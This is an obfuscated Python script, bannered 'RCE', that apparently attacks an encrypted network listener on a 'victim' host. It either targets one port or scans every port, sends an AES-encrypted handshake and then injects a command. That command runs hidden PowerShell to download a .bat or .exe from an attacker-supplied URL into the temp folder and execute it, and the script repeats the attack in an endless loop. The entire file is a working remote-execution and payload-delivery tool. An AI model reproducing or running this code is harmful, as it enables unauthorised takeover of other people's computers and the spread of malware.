import socket as a0,io as a1,random as a2,string as a3,hashlib as a4,os as a5,sys as a6,time as a7
from Crypto.Cipher import AES as a8
from Crypto.Util.Padding import pad as a9
from colorama import Fore as b0,init as b1
b1(autoreset=True)

def b2():
 a5.system('cls' if a6.platform=='win32' else 'clear')

def b3(b4):
 return ''.join(a2.choice(a3.ascii_uppercase+a3.digits) for _ in range(b4))

class b5:
 def __init__(self,b6):
  self.b6=b6
 def b7(self):
  b8=a1.BytesIO()
  b8.write(b'<Kkmm>'.join(self.b6))
  return b8.getbuffer().tobytes()

def b9(a0_obj,b10,b11):
 try:
  b12=a4.md5(b11.encode('utf-8')).digest()
  b13=a8.new(b12,a8.MODE_ECB)
  b14=b13.encrypt(a9(b10.b7(),16))
  a0_obj.send(str(len(b14)).encode('utf-8')+b'\x00')
  a0_obj.send(b14)
  return 1
 except:
  return 0

def c0(c1,c2,c3,c4):
 c5=None
 try:
  c5=a0.socket(a0.AF_INET,a0.SOCK_STREAM)
  c5.settimeout(10)
  c5.connect((c1,c2))
  print(b0.GREEN+f"[+] ok {c1}"+b0.RESET)
  c6=b3(16)
  c7=b5([b'hand',c6.encode()])
  if not b9(c5,c7,c3):
   print(b0.RED+"[+] no"+b0.RESET)
   c5.close()
   return 0
  c8='.bat' if c4.lower().endswith('.bat') else '.exe'
  c9=b3(5)+c8
  if c8=='.bat':
   da=f'start powershell.exe -WindowStyle Hidden $url="{c4}"; $o="$env:TEMP\\{c9}"; iwr -Uri $url -OutFile $o; Start-Process -FilePath cmd.exe -ArgumentList /c,$o'
  else:
   da=f'start powershell.exe -WindowStyle Hidden $url="{c4}"; $o="$env:TEMP\\{c9}"; iwr -Uri $url -OutFile $o; Start-Sleep -s 3; cmd.exe /c start "" $o'
  db=b5([b'hand+',c6.encode(),b' xx',f'" & {da}'.encode(),b'1:1'])
  if not b9(c5,db,c3):
   print(b0.RED+"[+] no"+b0.RESET)
   c5.close()
   return 0
  c5.close()
  return 1
 except:
  print(b0.RED+"[+] no"+b0.RESET)
 finally:
  if c5:
   try:
    c5.close()
   except:
    pass
 return 0

def dc():
 print(b0.MAGENTA+"""
   ██████╗  ██████╗ ███████╗
   ██╔══██╗██╔════╝ ██╔════╝
   ██████╔╝██║      █████╗  
   ██╔══██╗██║      ██╔══╝  
   ██║  ██║╚██████╗ ███████╗
   ╚═╝  ╚═╝ ╚══════╝ ╚══════╝
           Made By EpicDxoma ~ Fuck Skids
"""+b0.RESET)

def dd():
 b2()
 dc()
 print(b0.MAGENTA+"[+] enter victim info "+b0.RESET)
 c1=input(b0.MAGENTA+"[+] host: "+b0.RESET)
 print(b0.MAGENTA+"[+] 1 port"+b0.RESET)
 print(b0.MAGENTA+"[+] 2 scan"+b0.RESET)
 de=input(b0.MAGENTA+"[+] 1/2: "+b0.RESET)
 c2=None
 if de=='1':
  c2=int(input(b0.MAGENTA+"[+] port: "+b0.RESET))
 elif de=='2':
  c2=None
 else:
  print(b0.MAGENTA+"[+] wrong"+b0.RESET)
  return
 c3=input(b0.MAGENTA+"[+] key: "+b0.RESET)
 if not c3:
  c3="<123456789>"
 c4=input(b0.MAGENTA+"[+] url: "+b0.RESET)
 print(b0.MAGENTA+f"\n[+] target {c1}"+b0.RESET)
 if de=='1':
  print(b0.MAGENTA+f"[+] port {c2}"+b0.RESET)
  print(b0.MAGENTA+f"[+] key {c3}"+b0.RESET)
  print(b0.MAGENTA+f"[+] url {c4}"+b0.RESET)
  print(b0.MAGENTA+"[+] go\n"+b0.RESET)
  while 1:
   c0(c1,c2,c3,c4)
   a7.sleep(5)
 elif de=='2':
  print(b0.MAGENTA+"[+] scan 1-65535"+b0.RESET)
  print(b0.MAGENTA+f"[+] key {c3}"+b0.RESET)
  print(b0.MAGENTA+f"[+] url {c4}"+b0.RESET)
  print(b0.MAGENTA+"[+] start\n"+b0.RESET)
  while 1:
   for df in range(1,65536):
    try:
     dg=a0.socket(a0.AF_INET,a0.SOCK_STREAM)
     dg.settimeout(0.3)
     if dg.connect_ex((c1,df))==0:
      print(b0.GREEN+f"[+] {c1}:{df} open"+b0.RESET)
      c0(c1,df,c3,c4)
     dg.close()
    except:
     pass
    if df%1000==0:
     print(b0.YELLOW+f"[+] {df}/65535"+b0.RESET)
   print(b0.YELLOW+"[+] again\n"+b0.RESET)
   a7.sleep(30)

if __name__=="__main__":
 try:
  dd()
 except KeyboardInterrupt:
  print(b0.RED+"\n[+] exit"+b0.RESET)
 except Exception as dh:
  print(b0.RED+f"[+] err {dh}"+b0.RESET)
